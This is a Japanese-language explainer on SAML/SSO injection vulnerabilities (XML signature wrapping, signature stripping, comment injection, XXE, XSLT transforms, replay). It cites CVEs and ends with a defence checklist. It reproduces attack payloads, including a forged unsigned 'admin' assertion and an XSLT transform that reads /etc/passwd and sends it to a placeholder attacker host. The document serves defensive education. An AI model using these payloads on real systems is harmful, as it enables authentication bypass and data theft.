## SAML概説とインジェクション参照

本節では、SAML（Security Assertion Markup Language）を軸にしたSSO（シングルサインオン）実装で繰り返し観測されてきた脆弱性クラスを、業界横断のサーベイ記事と、実務者向けペイロード集の二資料から整理する。前者はSAML/OAuth 2.0/OIDC/JWTという4つのSSO関連技術を横串で比較した「脆弱性の系譜」であり、後者はSAMLレスポンスを直接改ざんするための具体的なXMLペイロード集である。両者を合わせて読むことで、「なぜSAMLはこれほど何度も同じ種類のバグを繰り返すのか」という構造的な理由と、「実際に手を動かすとしたらどのペイロードを組み立てるか」という実装レベルの理解の両方が得られる。

### SAMLが構造的に脆弱性を作り込みやすい理由

SAMLは、IdP（Identity Provider、認証を実施しID情報を発行する側）がSP（Service Provider、ログインを受け入れるアプリ側）に対して、XML形式の「アサーション（assertion、ユーザーの認証結果や属性を記述した署名付きの主張）」を送ることで認証を成立させるプロトコルである。ここでの本質的な難しさは、XMLという構造が「同じ意味データを複数の書き方で表現できる」うえに、XML署名（XML Digital Signature, XMLDSig）は「ドキュメント全体」ではなく「特定のノード（要素）の正規化されたバイト列」に対してハッシュを取り検証するという設計になっている点にある。この結果、署名検証ロジックと、実際に業務処理（誰が認証されたと判断するか）に使われるパース・参照ロジックが「別の実装・別の経路」になりやすく、両者の間にズレがあると「署名は正当だが、業務処理が見ている中身は別物」という状態を作れてしまう。

> ⚠️ **未取得の資料ではない**が、記事本文でも明言されている通り、このクラスのバグは**2012年・2018年・2024年**と、複数の年にわたって形を変えて再発している。SAMLの複雑さそのものが根本原因であるため、「一度直したら終わり」という性質の脆弱性ではない点を強調しておく。

### XML署名ラッピング（XSW: XML Signature Wrapping）攻撃

XSWは、SAMLインジェクションの中核をなす攻撃手法である。考え方はシンプルで、「署名検証コードが見ている要素」と「業務ロジックが読み取る要素」を意図的にズラすことにある。

**仕組み（なぜ成立するか）:**
1. IdPが発行した正規のアサーション（署名付き）はそのままレスポンス内に残す。
2. 攻撃者は、そのレスポンス内に**別の（未署名、または署名対象外の）偽アサーション**を追加で挿入する。
3. XML署名の`<ds:Reference URI="...">`は、署名対象ノードを**IDによる参照**で指定する。SPの実装によっては、「署名検証はReference URIが指すノードに対して行い、業務処理は文書順で最初に見つかったノード（あるいは別の位置のノード）に対して行う」というように、検証対象と処理対象が食い違う。
4. 結果として、署名検証自体は「正規のアサーションに対して」正しくパスするにもかかわらず、SPが実際にログインユーザーとして採用するのは攻撃者が挿入した偽アサーションになる。

PayloadsAllTheThingsのSAML Injectionページでは、この構造を次のように単純化して示している。

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

`Reference URI="legitimate"`が指すのは正規（Legitimate）の要素であり、署名検証はそこに対して行われる。しかし実装によっては、文書内で最初に出現する`Subject`（この例では`FA`＝Forged Assertionの`Attacker`）を業務処理側が採用してしまう。これがXSWの核心であり、実際の攻撃では単純にコピーを前後に置くだけでなく、SOAPの`<Envelope>`や`<Extensions>`、`<Object>`ブロックの中に偽アサーションを埋め込むなど、8種類ものバリエーション（XSW1〜XSW8）が学術研究およびツール実装として整理されている。バリエーションが分かれる理由は、SPの実装ごとに「署名検証ロジックがどのノードを起点にツリーを辿るか」「業務ロジックがどのノードを起点にツリーを辿るか」の実装差があり、その差を突くために挿入位置を変える必要があるためである。

**実際のCVEでの再発:**
- **CVE-2024-45409（Ruby SAML）**: CVSS 9.8。ネットワーク経由・認証不要で任意ユーザーへのなりすましが可能だった。
- **CVE-2024-6202（HaloITSM）**、**CVE-2024-6800（GitHub Enterprise Server）**: 同種のSAML SSOバイパス。
- 2018年には、Duo Securityの研究者らがOneLogin python-saml（**CVE-2017-11427**）、ruby-saml（**CVE-2017-11428**）、saml2-js（**CVE-2017-11429**）、OmniAuth SAML（**CVE-2017-11430**）、Shibboleth OpenSAML C++（**CVE-2018-0489**）という複数の著名ライブラリで、ほぼ同一の設計不備（XML DOM処理でコメントノードや走査順序を正しく扱わない）を横断的に発見し、CERT VU#475445として追跡された。

> 出典: Security Vulnerabilities in SAML, OAuth 2.0, OpenID Connect, and JWT — https://guptadeepak.com/security-vulnerabilities-in-saml-oauth-2-0-openid-connect-and-jwt/

**防御策:** SPの実装は、署名検証で使ったのと**同一のノード**を業務処理でも使用しなければならない。具体的には、署名検証後に「検証済みのDOMサブツリーへの参照」をそのまま業務ロジックに渡し、文書全体を再走査して「最初に見つかったSubject」のような取り方をしないことが必須である。また、レスポンス内に複数のアサーションや複数の署名が存在すること自体を異常とみなし、検出・拒否する実装（SAMLRaiderなどの検査ツールが行うチェック）を導入することが推奨される。

### 署名除去（Signature Stripping）

XSWよりさらに単純な攻撃で、「署名セクションそのものを丸ごと削除する」というものである。PayloadsAllTheThingsの言葉を借りれば、「署名なしのSAMLアサーションを受け入れることは、パスワードを確認せずにユーザー名だけを受け入れるのと同じである」。SPの実装が「署名要素が存在しない場合は検証をスキップする」という誤った分岐を持っていると、攻撃者は署名を単に取り除いた（あるいは最初から付けなかった）アサーションを送るだけで、任意の`NameID`（ユーザー識別子）としてログインできてしまう。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="http://localhost:7001/saml2/sp/acs/post" ...>
    <saml2:Issuer ...>REDACTED</saml2:Issuer>
    <saml2p:Status ...>
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion ...>
        <saml2:Issuer ...>REDACTED</saml2:Issuer>
        <saml2:Subject ...>
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z"
                  Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-04-22T10:33:53.593Z" ...>
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" ...>
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

見ての通り、この`<saml2:Assertion>`には`<ds:Signature>`要素が存在しない。`NameID`は単なる文字列`admin`であり、これをそのまま信頼してセッションを発行してしまうSPでは、攻撃者はブラウザの開発者ツールやプロキシツール（Burp Suiteなど）でPOSTボディ中の`SAMLResponse`（Base64エンコードされたXML）をデコードし、このように書き換えたうえで再エンコードして送信するだけで管理者になりすませる。

**防御策:** SP側は「署名が存在しない、または`Issuer`が期待値と異なる、あるいは使用アルゴリズムが弱い」場合は**無条件に拒否**しなければならない。署名検証の要否を設定でOFFにできる実装（デバッグ用の抜け道が本番に残るケース）は特に危険である。

### XMLコメント注入によるパーサー混乱

**仕組み:** XMLパーサーの中には、コメント（`<!-- ... -->`）を含むテキストノードを結合する際に、コメント部分を除去してから前後のテキストを連結してしまう実装がある。一方で、署名対象のダイジェスト計算では正規化（Canonicalization）の仕様上コメントが別ノードとして扱われるため、「署名時に見ていた文字列」と「アプリケーションが最終的に読み取る文字列」がズレる。

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

攻撃者は正規に登録されている`user@user.com`という文字列を`NameID`の先頭に含めつつ、その直後にコメントを挿入して`.evil.com`という文字列を続ける。署名対象としてダイジェストが計算される際には（実装によって）コメント込みの文字列、あるいはコメントを除いた`user@user.com`として扱われる一方、後続のビジネスロジックがテキストノードを単純結合すると`user@user.com.evil.com`という、署名時には存在しなかった文字列がユーザー識別子として使われてしまう。この手口は前述のOneLogin・OmniAuth-SAML・Shibbolethなど複数実装に共通する脆弱性（CVE-2017-11427等）として実際に報告された。

**防御策:** XMLパーサーの設定で、コメントノードを解析前に完全に除去する（strip）か、少なくとも署名検証とビジネスロジックの双方で同一の除去済みDOMを使い回す。

### XML外部エンティティ（XXE）インジェクション

**仕組み:** SAMLレスポンスはXML文書であるため、パーサーがDTD（文書型定義）の外部エンティティ展開を許可している場合、XXE攻撃が成立する。XXEはXMLパーサーが`<!DOCTYPE>`宣言内で定義された「エンティティ（`&name;`のような置換用の変数）」を、外部ファイルや外部URLの内容に展開してしまう脆弱性である。SAML特有の興味深い点は、エンティティ定義自体は**署名対象のダイジェスト計算後にパーサーが展開する**ため、「署名は変更されていないのに、実際に読み取られる値だけがすり替わる」という形で署名検証をすり抜けられることにある。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

この例では`&s;`が`"s"`に、`&f1;`が`"f1"`に展開され、最終的な属性値は`staff1`になる。実際の攻撃では、内部エンティティ定義の代わりに**外部エンティティ**（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`のように外部リソースを指すもの）を定義し、その内容をレスポンスの属性値やエラーメッセージ経由で外部に漏洩させる（ファイル読み取り、SSRF、場合によってはDoS）ことが狙われる。

**防御策:** XMLパーサーでDTDの処理自体を無効化する（`disallow-doctype-decl`、あるいは外部エンティティ解決のみを無効化するオプション）。多くの現代的なXMLライブラリはデフォルトで安全側に倒しているが、レガシーなSAML実装や独自パーサーでは依然としてリスクが残る。

### XSLT変換によるコード実行・情報漏洩

**仕組み:** XML署名の仕様（XMLDSig）には、署名対象データに対して`<ds:Transform>`で変換処理を適用できるオプション機能があり、その変換方式の一つとして**XSLT（Extensible Stylesheet Language Transformations）**が許可されている場合がある。XSLTはチューリング完全に近い変換言語であり、`unparsed-text()`のような拡張関数を使うとローカルファイルの読み取りや、`unparsed-text()`に外部URLを渡すことでの外部送信（SSRF/データ持ち出し）が可能になる実装がある。

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

処理の流れとしては、SPが署名検証の一環としてこの変換を実行してしまうと、まず`/etc/passwd`（防御目的の学習用の一般的な例示ファイル）の内容を読み取り、それをURLエンコードして攻撃者サーバーのURLに連結し、`unparsed-text()`で「そのURLへのリクエスト」を発生させることでファイル内容を外部に持ち出す、という多段の悪用が成立する。これは前述のXXEと同様、「署名検証の過程そのものに攻撃者が制御可能な処理を挟み込める」という、SAMLの検証パイプラインが複雑であることに起因する脆弱性である。

**防御策:** 署名検証ライブラリで、変換方式としてXSLTを許可しない設定にする（そもそも標準の署名検証にXSLT変換が必要になる正当なユースケースはSSOにおいてはほぼ存在しない）。多くの現代的なSAML実装ライブラリはXSLT変換をデフォルトで無効化しているが、独自実装やレガシー実装では確認が必要である。

> 出典: PayloadsAllTheThings — SAML Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection

### リプレイ攻撃（有効期限検証の欠如）

SAMLアサーションには`<saml2:Conditions NotBefore="..." NotOnOrAfter="...">`という有効期間の指定が含まれる。SPがこの値を検証しない、あるいは一度使用されたアサーションを再利用不可にする仕組み（アサーションIDのワンタイム使用管理）を持たない場合、盗聴・傍受された正規のSAMLレスポンスを攻撃者が何度でも再送し、セッションを乗っ取れる。実例として**CVE-2018-14637**では、SP側が`NotOnOrAfter`を無視する実装バグにより、古いSAML応答が繰り返し受理されてしまう問題が確認された。

**防御策:** `NotBefore`/`NotOnOrAfter`の厳密な検証、アサーションIDの使用済み管理（リプレイキャッシュ）、可能であればSAMLレスポート自体のTTLを短く保つこと。

### エンタープライズ製品での実例（設計脆弱性のインパクトの大きさ）

- **Oracle Access Manager（CVE-2021-35587）**: CVSS 9.8。未認証のリモート攻撃者による完全な乗っ取りが可能とされた。
- **Shibboleth OpenSAML（2023年）のSSRF**: `<KeyInfo>`要素（署名検証に使う鍵情報を指定する要素）を悪用し、SPやIdPに任意の外部URLへのリクエストを強制させるSSRF（Server-Side Request Forgery）。OpenSAML XMLTooling V3.2.4で修正された。DoS誘発や他の攻撃との連鎖に使われる懸念が指摘されている。

> 出典: Security Vulnerabilities in SAML, OAuth 2.0, OpenID Connect, and JWT — https://guptadeepak.com/security-vulnerabilities-in-saml-oauth-2-0-openid-connect-and-jwt/

### 検査・防御に使えるツール

PayloadsAllTheThingsのSAML Injectionページでは、実際の診断（防御目的の自己検証・許可を得たペネトレーションテスト）で使われる代表的なツールが紹介されている。

- **SAMLRaider**: Burp Suite拡張で、SAMLレスポンスのデコード・編集、XSWペイロードの自動生成、証明書のクローン作成などを支援する。
- **XSW（XML Signature Wrapping）Burp拡張**: XSW1〜XSW8のバリエーションを自動的に生成し、対象SPがどのパターンに脆弱かを機械的に確認できる。
- **OWASP ZAP SAML Support アドオン**: ZAPプロキシ上でSAMLメッセージを解析・改ざんするための支援機能。

これらのツールは、防御側の視点では「自組織のSP実装が上記のどのクラスの攻撃に耐性があるか」を、許可された環境下で網羅的に確認するために使うべきものであり、本節の目的もそのための知識整理にある。

### まとめ：SAML防御のチェックリスト

1. 署名検証で使用したノードと、業務ロジックが読み取るノードを**完全に一致**させる（XSW対策の本質）。
2. 署名が存在しない、または`Issuer`・アルゴリズムが期待値と異なるレスポンスは無条件に拒否する（署名除去対策）。
3. XMLパーサーでDTD・外部エンティティ展開を無効化する（XXE対策）。
4. 署名検証パイプラインでXSLT変換を許可しない（XSLT攻撃対策）。
5. コメントノードを解析前に除去するか、署名検証とビジネスロジックで同一の正規化済みDOMを使う（コメント注入対策）。
6. `NotBefore`/`NotOnOrAfter`を厳密に検証し、アサーションIDの再利用を防ぐリプレイキャッシュを持つ（リプレイ対策）。
7. ライブラリは常に最新に保つ。SAML関連の重大CVEは2012年・2017〜2018年・2021年・2023年・2024年と繰り返し発生しており、「枯れた技術だから安全」という思い込みは禁物である。
